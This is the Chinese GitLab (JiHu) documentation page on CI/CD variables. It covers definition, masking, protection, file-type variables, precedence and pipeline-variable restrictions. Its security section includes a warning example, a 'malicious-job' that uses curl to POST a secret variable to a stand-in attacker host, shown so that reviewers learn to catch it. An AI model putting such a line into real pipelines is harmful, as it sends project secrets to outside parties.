---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see <https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments>
title: CI/CD 变量
description: 配置、使用与安全。
---

{{< details >}}

- Tier: 基础版，专业版，旗舰版
- Offering: JihuLab.com，私有化部署

{{< /details >}}

CI/CD 变量是一种环境变量。您可以使用它们来：

- 控制作业和流水线的行为。
- 存储您想要重复使用的值，例如在[作业脚本](job_scripts.md)中。
- 避免在`.gitlab-ci.yml` 文件中硬编码值。

变量名称受 [runner 所使用的 shell](https://gitlab.cn/docs/runner/shells/) 限制，
该 shell 用于执行脚本。每个 shell 都有自己的一组保留变量名。

为确保行为一致，您应始终将变量值放在单引号或双引号中。
变量由 [Psych YAML 解析器](https://docs.ruby-lang.org/en/master/Psych.html)在内部解析，
因此带引号和不带引号的变量可能会以不同方式解析。例如：

- `VAR1: 012345` 被解释为八进制值，因此该值变为 `5349`。
- `VAR1: "012345"` 被解析为字符串，其值为 `012345`。
- `VAR1: 019` 被解析为字符串 `"019"`，而不是八进制，因为 `9` 不是有效的
  八进制数字。八进制解析仅在所有数字均为 0-7 时适用。

有关极狐GitLab CI/CD 高级用法的更多信息，请参阅 GitLab 工程师分享的 [7 个高级极狐GitLab CI 工作流技巧](https://about.gitlab.com/webcast/7cicd-hacks/)。

<a id="predefined-cicd-variables"></a>

## 预定义 CI/CD 变量

极狐GitLab CI/CD 提供了一组[预定义 CI/CD 变量](predefined_variables.md)，
可在流水线配置和作业脚本中使用。这些变量包含有关作业、流水线的信息，以及流水线被触发或运行时的其他可能需要的值。

您可以在`.gitlab-ci.yml`中使用预定义 CI/CD 变量，而无需先声明它们。例如：

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

此示例中的脚本输出 `The job's stage is 'test'`。

<a id="define-a-cicd-variable-in-the-gitlab-ciyml-file"></a>

## 在 `.gitlab-ci.yml` 文件中定义 CI/CD 变量

要在`.gitlab-ci.yml` 文件中创建 CI/CD 变量，请使用
[`variables`](../yaml/_index.md#variables) 关键字定义变量及其值。

保存在`.gitlab-ci.yml` 文件中的变量对所有有权访问代码仓库的用户可见，因此应仅存储非敏感的项目配置。例如，保存在 `DATABASE_URL` 变量中的数据库 URL。包含密钥等敏感值的变量应在 UI 中添加。

您可以在以下位置定义 `variables`：

- 作业中：该变量仅在该作业的 `script`、`before_script` 或 `after_script` 部分中可用，并可用于某些[作业关键字](../yaml/_index.md#job-keywords)。
- `.gitlab-ci.yml` 文件的顶层：该变量作为流水线中所有作业的默认值可用，除非某个作业定义了同名变量。作业的变量优先。

在这两种情况下，您都不能将这些变量与[全局关键字](../yaml/_index.md#global-keywords)一起使用。

例如：

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

在此示例中：

- `job1` 输出：`Variables are 'A default variable' and 'Job 1 variable'`
- `job2` 输出：`Variables are 'Different value than default', 'Job 2 variable', and ''`

使用 `value` 和 `description` 关键字为手动触发的流水线定义[预填充变量](../pipelines/_index.md#prefill-variables-in-manual-pipelines)。

<a id="skip-default-variables-in-a-single-job"></a>

### 在单个作业中跳过默认变量

如果您不希望默认变量在某个作业中可用，请将 `variables` 设置为`{}`：

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

<a id="define-a-cicd-variable-in-the-ui"></a>

## 在 UI 中定义 CI/CD 变量

令牌或密码等敏感变量应存储在 UI 的设置中，而不是`.gitlab-ci.yml` 文件中。

默认情况下，来自 forked 项目的流水线无法访问父项目可用的 CI/CD 变量。
如果您[在父项目中为来自 fork 的合并请求运行合并请求流水线](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)，
则所有变量都可供该流水线使用。

<a id="for-a-project"></a>

### 为项目

您可以将 CI/CD 变量添加到项目的设置中。项目最多可以有 8000 个 CI/CD 变量。

先决条件：

- 您必须是具有维护者角色的项目成员。

要在项目设置中添加或更新变量：

1. 在顶部栏中，选择**搜索或跳转到**并找到您的项目。
1. 在左侧边栏中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 选择**添加变量**并填写详细信息：
   - **键**：必须为一行，不含空格，只能使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 runner 操作系统的任何限制约束。
     如果**可见性**设置为**掩码**
     或**掩码并隐藏**，则该值有额外限制。
   - **类型**：`Variable`（默认）或 [`File`](#use-file-type-cicd-variables)。
   - **环境范围**：可选。**所有（默认）**（`*`）、特定的[环境](../environments/_index.md)，
     或通配符环境范围。
   - **保护变量**：可选。如果选中，该变量仅在受保护分支或受保护标签上运行的流水线中可用。
   - **可见性**：选择**可见**、**掩码**（默认）或**掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，该变量可以引用另一个变量。
     如果**可见性**设置为**掩码**或**掩码并隐藏**，则无法引用另一个变量。

或者，项目变量可以[通过 API 添加](../../api/project_level_variables.md)。

<a id="for-a-group"></a>

### 为群组

您可以使 CI/CD 变量对群组中的所有项目可用。群组最多可以有 30000 个 CI/CD 变量。

先决条件：

- 您必须是具有所有者角色的群组成员。

要添加群组变量：

1. 在顶部栏中，选择**搜索或跳转到**并找到您的群组。
1. 在左侧边栏中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 选择**添加变量**并填写详细信息：
   - **键**：必须为一行，不含空格，只能使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 runner 操作系统的任何限制约束。
     如果**可见性**设置为**掩码**
     或**掩码并隐藏**，则该值有额外限制。
   - **类型**：`Variable`（默认）或 [`File`](#use-file-type-cicd-variables)。
   - **保护变量**：可选。如果选中，该变量仅在受保护分支或受保护标签上运行的流水线中可用。
   - **可见性**：选择**可见**、**掩码**（默认）、**掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，该变量可以引用另一个变量。
     如果**可见性**设置为**掩码**或**掩码并隐藏**，则无法引用另一个变量。

项目中可用的群组变量列在项目的**设置** > **CI/CD** > **变量**部分中。来自子群组的变量会被递归继承。

或者，群组变量可以[通过 API 添加](../../api/group_level_variables.md)。

<a id="environment-scope"></a>

#### 环境范围

{{< details >}}

- Tier: 专业版，旗舰版

{{< /details >}}

要将群组 CI/CD 变量设置为仅对特定环境可用：

1. 在顶部栏中，选择**搜索或跳转到**并找到您的群组。
1. 在左侧边栏中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 在该变量的右侧，选择**编辑**（{{< icon name="pencil" >}}）。
1. 对于**环境范围**，选择**所有（默认）**（`*`）、特定的[环境](../environments/_index.md)，
   或通配符环境范围。

<a id="for-an-instance"></a>

### 为实例

{{< details >}}

- Tier: 基础版，专业版，旗舰版
- Offering: 私有化部署

{{< /details >}}

您可以使 CI/CD 变量对极狐GitLab 实例中的所有项目和群组可用。

先决条件：

- 您必须具有该实例的管理员访问权限。

要添加实例变量：

1. 在右上角，选择**管理员**。
1. 在左侧边栏中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 选择**添加变量**并填写详细信息：
   - **键**：必须为一行，不含空格，只能使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 runner 操作系统的任何限制约束。
     如果**可见性**设置为**可见**，则没有其他限制。
   - **类型**：`Variable`（默认）或 `File`。
   - **保护变量**：可选。如果选中，该变量仅在受保护分支或标签上运行的流水线中可用。
   - **可见性**：选择**可见**、**掩码**（默认）或**掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，该变量可以引用另一个变量。
     如果**可见性**设置为**掩码**或**掩码并隐藏**，则无法引用另一个变量。

或者，实例变量可以[通过 API 添加](../../api/instance_level_ci_variables.md)。

<a id="cicd-variable-security"></a>

## CI/CD 变量安全

推送到`.gitlab-ci.yml` 文件的代码可能会危及您的变量。变量可能在作业日志中意外暴露，或被恶意发送到第三方服务器。

在您执行以下操作之前，请审查所有对`.gitlab-ci.yml` 文件引入更改的合并请求：

- [在父项目中为来自 forked 项目的合并请求运行流水线](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)。
- 合并更改。

在您添加文件或对其运行流水线之前，请审查导入项目的`.gitlab-ci.yml` 文件。

以下示例展示了`.gitlab-ci.yml` 文件中的恶意代码：

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

为帮助降低通过类似 `accidental-leak-job`的脚本意外泄露密钥的风险，所有包含敏感信息的变量都应始终在作业日志中掩码。您还可以[将变量限制为仅受保护分支和标签可用](#protect-a-cicd-variable)。

或者，[连接外部密钥管理提供商](../secrets/_index.md)
来存储和检索密钥。

类似 `malicious-job`的恶意脚本必须在审查过程中被捕获。审核人在发现此类代码时绝不应触发流水线，因为恶意代码可能危及掩码变量和受保护变量。

变量值使用 [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
加密并存储在数据库中。此数据可以使用
有效的[密钥文件](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost)读取和解密。

<a id="mask-a-cicd-variable"></a>

### 掩码 CI/CD 变量

> [!warning]
> 掩码 CI/CD 变量并不能保证阻止恶意用户
> 访问变量值。为确保敏感信息的安全，
> 请考虑使用[外部密钥](../secrets/_index.md)和[文件类型变量](#use-file-type-cicd-variables)
> 来防止 `env` 或 `printenv` 等命令打印密钥变量。

您可以为项目、群组或实例掩码 CI/CD 变量，以防止其值出现在作业日志中。当作业输出掩码变量的值时，该值会在作业日志中被替换为 `[MASKED]`。在某些情况下，`[MASKED]` 值后面还可能跟着 `x` 字符。

先决条件：

- 您必须具有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui)所需的相同角色或访问级别。

要掩码变量：

1. 对于群组、项目，或在**管理员**区域中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 在您要保护的变量旁边，选择**编辑**。
1. 在**可见性**下，选择**掩码变量**。
1. 推荐。清除[**展开变量引用**](#allow-cicd-variable-expansion)复选框。
   如果启用了变量展开，则变量值中唯一可以使用的非字母数字字符是：`_`、`:`、`@`、`-`、`+`、`.`、`~`、`=`、`/` 和 `~`。
   当该设置禁用时，可以使用所有字符。
1. 选择**更新变量**。

变量的值必须：

- 为一行且不含空格。
- 为 8 个字符或更长。
- 不与现有预定义或自定义 CI/CD 变量的名称匹配。

如果某个进程以略微修改的方式输出该值，则该值无法被掩码。例如，如果 shell 添加了 ` \ ` 来转义特殊字符，则该值不会被掩码：

- 掩码变量值示例：`My[value]`
- 此输出不会被掩码：`My\[value\]`

当启用 `CI_DEBUG_SERVICES` 时，变量值可能会被泄露。有关更多信息，请参阅
[服务容器日志记录](../services/_index.md#capturing-service-container-logs)。

<a id="hide-a-cicd-variable"></a>

### 隐藏 CI/CD 变量

除了掩码之外，您还可以防止 CI/CD 变量的值在 **CI/CD** 设置页面中被泄露。隐藏变量只能在创建新变量时进行，您无法将现有变量更新为隐藏状态。

先决条件：

- 您必须具有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui)所需的相同角色或访问级别。
- 变量值必须符合[掩码变量的要求](#mask-a-cicd-variable)。

要隐藏变量，请在您[在 UI 中添加新的 CI/CD 变量](#define-a-cicd-variable-in-the-ui)时，
在**可见性**部分中选择**掩码并隐藏**。保存变量后，该变量可以在 CI/CD 流水线中使用，但无法在 UI 中再次显示。

<a id="protect-a-cicd-variable"></a>

### 保护 CI/CD 变量

您可以将项目、群组或实例 CI/CD 变量配置为仅对
在[受保护分支](../../user/project/repository/branches/protected.md)
或[受保护标签](../../user/project/protected_tags.md)上运行的流水线可用。

合并结果流水线和合并请求流水线可以[选择性地访问受保护变量](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners)。

先决条件：

- 您必须具有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui)所需的相同角色或访问级别。

要将变量设置为受保护：

1. 对于项目或群组，转到**设置** > **CI/CD**。
1. 展开**变量**。
1. 在您要保护的变量旁边，选择**编辑**。
1. 选中**保护变量**复选框。
1. 选择**更新变量**。

该变量对所有后续流水线可用。

<a id="use-file-type-cicd-variables"></a>

### 使用文件类型 CI/CD 变量

所有预定义 CI/CD 变量以及`.gitlab-ci.yml` 文件中定义的变量
都是“变量”类型（[API 中为 `"variable_type": "env_var"`](../../api/project_level_variables.md)）。

变量类型变量：

- 由键值对组成。
- 在作业中作为环境变量提供，其中：
  - CI/CD 变量键作为环境变量名称。
  - CI/CD 变量值作为环境变量值。

项目、群组和实例 CI/CD 变量默认为“变量”类型，但可以选择性地设置为“文件”类型（API 中为 `"variable_type": "file"`）。文件类型变量：

- 由键、值和文件组成。
- 在作业中作为环境变量提供，其中：
  - CI/CD 变量键作为环境变量名称。
  - CI/CD 变量值保存到临时文件。
  - 临时文件的路径作为环境变量值。

对于需要文件作为输入的工具，请使用文件类型 CI/CD 变量。

例如，AWS CLI 和 `kubectl` 都是使用 `File` 类型变量进行配置的工具。如果您将 `kubectl` 与以下内容一起使用：

- 一个键为 `KUBE_URL`、值为 `https://example.com`的变量。
- 一个键为 `KUBE_CA_PEM`、值为证书的文件类型变量。

将 `KUBE_URL` 作为 `--server` 选项传递（该选项接受变量），并将 `$KUBE_CA_PEM` 作为 `--certificate-authority` 选项传递（该选项接受文件路径）：

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

<a id="use-a-gitlab-ciyml-variable-as-a-file-type-variable"></a>

#### 将 `.gitlab-ci.yml` 变量用作文件类型变量

您无法将[在 `.gitlab-ci.yml` 文件中定义的](#define-a-cicd-variable-in-the-gitlab-ciyml-file) CI/CD 变量
设置为文件类型变量。如果您有一个需要文件路径作为输入的工具，但您想使用在 `.gitlab-ci.yml`中定义的变量：

- 运行一个将变量值保存到文件中的命令。
- 将该文件与您的工具一起使用。

例如：

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

<a id="allow-cicd-variable-expansion"></a>

## 允许 CI/CD 变量展开

您可以将变量设置为将包含 `$` 字符的值视为对另一个变量的引用。当流水线运行时，该引用会展开以使用被引用变量的值。

在 UI 中定义的 CI/CD 变量默认不展开。对于在
`.gitlab-ci.yml` 文件中定义的 CI/CD 变量，请使用 [`variables:expand` 关键字](../yaml/_index.md#variablesexpand)控制变量展开。

先决条件：

- 您必须具有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui)所需的相同角色或访问级别。

要为变量启用变量展开：

1. 对于项目或群组，转到**设置** > **CI/CD**。
1. 展开**变量**。
1. 在您不希望展开的变量旁边，选择**编辑**。
1. 选中**展开变量引用**复选框。
1. 选择**更新变量**。

> [!note]
> 如果您想使用变量展开，请勿[掩码](#mask-a-cicd-variable)变量值。
> 如果同时使用掩码和变量展开，字符限制会阻止
> 使用 `$` 引用其他变量。

<a id="cicd-variable-precedence"></a>

## CI/CD 变量优先级

您可以在多个位置定义同名 CI/CD 变量。当作业运行时，极狐GitLab 使用优先级最高的来源中的值。存在的最高优先级值会覆盖所有较低优先级的值。

从高到低，优先级顺序为：

1. 在
   [流水线执行策略](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables)
   或[扫描执行策略](../../user/application_security/policies/scan_execution_policies.md)中定义的变量。
   这些变量仅适用于策略添加到流水线的作业，而不适用于
   流水线中的其他作业。
1. 手动作业变量，在您运行手动作业时设置。
1. [流水线变量](#use-pipeline-variables)，来自：
   - **运行流水线**页面
   - 流水线计划
   - 流水线 API
   - 触发器 API
   - `ci.variable` 推送选项
   - 上游流水线
1. [项目变量](#for-a-project)。
1. [群组变量](#for-a-group)。如果群组及其子群组中存在相同的变量名，
   则作业使用最接近的子群组中的值。例如，如果您有
   `Group > Subgroup 1 > Subgroup 2 > Project`，则 `Subgroup 2`中定义的变量优先。
1. [实例变量](#for-an-instance)。
1. 来自 `dependencies` 或 `needs`中列出的作业的
   [`dotenv` 报告](dotenv_variables.md#pass-variables-to-later-jobs)中的变量。
1. `.gitlab-ci.yml` 文件中的变量，从高到低优先级为：
   1. 作业中的 [`rules:variables`](../yaml/_index.md#rulesvariables)。
   1. 作业中的 `variables`。
   1. [`workflow:rules:variables`](../yaml/_index.md#workflowrulesvariables)。
   1. 文件顶层的[默认 `variables`](../yaml/_index.md#default-variables)。
1. [部署变量](predefined_variables.md#deployment-variables)。
1. [预定义变量](predefined_variables.md)。并非所有预定义变量都具有最低
   优先级。您无法覆盖 `CI_ENVIRONMENT_ID`、`CI_ENVIRONMENT_SLUG`、`CI_ENVIRONMENT_URL`
   或 `CI_PAGES_URL`。

例如，您的项目有一个设置为 `production`的 `DEPLOY_TARGET` 项目变量，以及以下
`.gitlab-ci.yml` 文件：

```yaml
variables:
  DEPLOY_TARGET: "staging"

deploy:
  variables:
    DEPLOY_TARGET: "review"
  script:
    - echo "Deploying to $DEPLOY_TARGET"
```

在此示例中：

- `deploy` 作业打印 `Deploying to production`，因为项目变量优先于
  `.gitlab-ci.yml` 文件中设置的两个值。
- 如果没有项目变量，该作业打印 `Deploying to review`，因为在作业中定义的变量
  优先于默认变量。
- 如果您手动运行流水线并将 `DEPLOY_TARGET` 设置为 `canary`，则该作业打印
  `Deploying to canary`，因为流水线变量优先于项目变量。

其他详细信息：

- 来自 [`secrets`](../yaml/_index.md#secrets)的值不属于此优先级顺序。
  runner 在作业运行时从外部密钥管理器检索它们。

- [输入](../inputs/_index.md)不是 CI/CD 变量，不参与此优先级顺序。
  极狐GitLab 在创建流水线时用其值替换输入，因此项目、群组或
  实例变量无法更改输入值。

<a id="use-pipeline-variables"></a>

## 使用流水线变量

流水线变量是在运行新流水线时指定的变量。

> [!note]
> 在 [极狐GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables)
> 及更高版本中，推荐使用[流水线输入](../inputs/_index.md#for-a-pipeline)而非传递流水线变量。
> 为增强安全性，在使用输入时，您应[禁用流水线变量](#restrict-pipeline-variables)。

先决条件：

- 您必须在项目中具有开发者角色。

您可以在以下情况下指定流水线变量：

- 在 UI 中[手动运行流水线](../jobs/job_control.md#specify-variables-when-running-manual-jobs)。
- 创建[计划流水线](../pipelines/schedules.md#create-a-pipeline-schedule)。
- 使用 [`pipelines` API 端点](../../api/pipelines.md#create-a-new-pipeline)创建流水线。
- 使用 [`triggers` API 端点](../triggers/_index.md#pass-cicd-variables-in-the-api-call)创建流水线。
- 使用[推送选项](../../topics/git/commit.md#push-options-for-gitlab-cicd)。
- 使用 [`variables` 关键字](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline)、
  [`trigger:forward` 关键字](../yaml/_index.md#triggerforward)或 [`dotenv` 变量](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job)
  将变量传递到下游流水线。

这些变量具有高优先级，可以覆盖在项目、群组或实例设置中，或`.gitlab-ci.yml` 文件中定义的同名变量。

> [!warning]
> 在大多数情况下，您应避免覆盖预定义变量，因为这可能导致流水线行为异常。

<a id="restrict-pipeline-variables"></a>

### 限制流水线变量

您可以将使用流水线变量运行流水线的权限限制为特定用户角色。当角色较低的用户尝试使用流水线变量时，他们会收到
`Insufficient permissions to set pipeline variables` 错误消息。

先决条件：

- 您必须在项目中具有维护者角色。如果最低角色之前设置为 `owner`
  或 `no_one_allowed`，则您必须在项目中具有所有者角色。

要将流水线变量的使用限制为仅维护者角色及更高角色：

- 转到**设置** > **CI/CD** > **变量**。
- 在**使用流水线变量的最低角色**下，选择以下之一：
  - `no_one_allowed`：任何流水线都不能使用流水线变量运行。
    这是 JihuLab.com 上新命名空间中新项目的默认值。
    设置为此值后，只有所有者角色可以更改它。
  - `owner`：只有具有所有者角色的用户可以使用流水线变量运行流水线。
    设置为此值后，只有所有者角色可以更改它。
  - `maintainer`：只有具有维护者或所有者角色的用户可以使用流水线变量运行流水线。
    这是在极狐GitLab 私有化部署上未指定时的默认值。
  - `developer`：只有具有开发者、维护者或所有者角色的用户可以使用流水线变量运行流水线。

您还可以使用[项目 API](../../api/projects.md#update-a-project) 设置
`ci_pipeline_variables_minimum_override_role` 设置的角色。

此限制不影响来自项目或群组设置的 CI/CD 变量。大多数作业仍可以在 YAML 配置中使用 `variables` 关键字。
使用 `trigger` 关键字启动[多项目流水线](../pipelines/downstream_pipelines.md#multi-project-pipelines)
的作业则不能，因为这些作业会将其变量作为流水线变量传递到下游流水线。

对于这些作业：

- 下游项目中的设置适用。极狐GitLab 会检查用户在下游项目中的角色。
  他们在上游项目中的角色没有影响。
- 如果他们的角色低于下游项目中设置的最低角色，则触发作业
  会失败并显示 `Insufficient permissions to set pipeline variables` 错误，极狐GitLab 不会
  创建下游流水线。
- 不传递任何变量的触发作业不受限制。触发作业会继承
  [默认 `variables`](../yaml/_index.md#default-variables)，因此没有 `variables`
  关键字的作业仍可以传递变量。要防止这种情况，请使用
  [`inherit:variables: false`](../yaml/_index.md#inheritvariables)。
- 该限制也适用于使用
  [`trigger:forward:pipeline_variables`](../pipelines/downstream_pipelines.md#control-what-type-of-variables-to-forward-to-downstream-pipelines) 转发的变量。
  此转发默认禁用。

在同一项目中触发[父子流水线](../pipelines/downstream_pipelines.md#parent-child-pipelines)
的作业不受此设置限制。

<a id="enable-pipeline-variable-restriction-for-multiple-projects"></a>

#### 为多个项目启用流水线变量限制

对于有许多项目的群组，您可以在所有不使用流水线变量的项目中禁用它们。此选项会将**使用流水线变量的最低角色**设置设为 `no_one_allowed`，适用于从未使用过流水线变量的项目。

先决条件：

- 您必须具有该群组的所有者角色。

要在群组中的项目里启用流水线变量限制设置：

1. 在顶部栏中，选择**搜索或跳转到**并找到您的群组。
1. 在左侧边栏中，选择**设置** > **CI/CD**。
1. 展开**变量**。
1. 在**在不使用流水线变量的项目中禁用它们**部分中，
   选择**开始迁移**。

迁移在后台运行。迁移完成后，您会收到电子邮件通知。项目维护者之后可以根据需要更改其各个项目的设置。

<a id="exporting-variables"></a>

## 导出变量

在单独的 shell 上下文中执行的脚本不共享导出、别名、本地函数定义或任何其他本地 shell 更新。

这意味着如果作业失败，用户定义的脚本创建的变量不会被导出。

当 runner 执行`.gitlab-ci.yml`中定义的作业时：

- `before_script`中指定的脚本和主脚本在
  单个 shell 上下文中一起执行，并被连接起来。
- `after_script`中指定的脚本在与
  `before_script` 和指定脚本完全独立的 shell 上下文中运行。

无论脚本在哪个 shell 中执行，runner 输出都包括：

- 预定义变量。
- 在以下位置定义的变量：
  - 实例、群组或项目 CI/CD 设置。
  - `.gitlab-ci.yml` 文件中的 `variables:` 部分。
  - `.gitlab-ci.yml` 文件中的 `secrets:` 部分。
  - `config.toml`。

runner 无法处理手动导出、shell 别名以及在脚本主体中执行的函数，例如 `export MY_VARIABLE=1`。

例如，在以下`.gitlab-ci.yml` 文件中，定义了以下脚本：

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

当 runner 执行该作业时：

1. 执行 `before_script`：
   1. 打印到输出。
   1. 为 `MY_VARIABLE` 定义变量。
1. 执行 `script`：
   1. 打印到输出。
   1. 打印 `JOB_DEFINED_VARIABLE`的值。
   1. 打印 `CI_COMMIT_SHA`的值。
   1. 打印 `MY_VARIABLE`的值。
1. 在新的、独立的 shell 上下文中执行 `after_script`：
   1. 打印到输出。
   1. 打印 `JOB_DEFINED_VARIABLE`的值。
   1. 打印 `CI_COMMIT_SHA`的值。
   1. 打印 `MY_VARIABLE`的空值。无法检测到该变量值，因为 `after_script` 与 `before_script` 处于不同的 shell 上下文中。
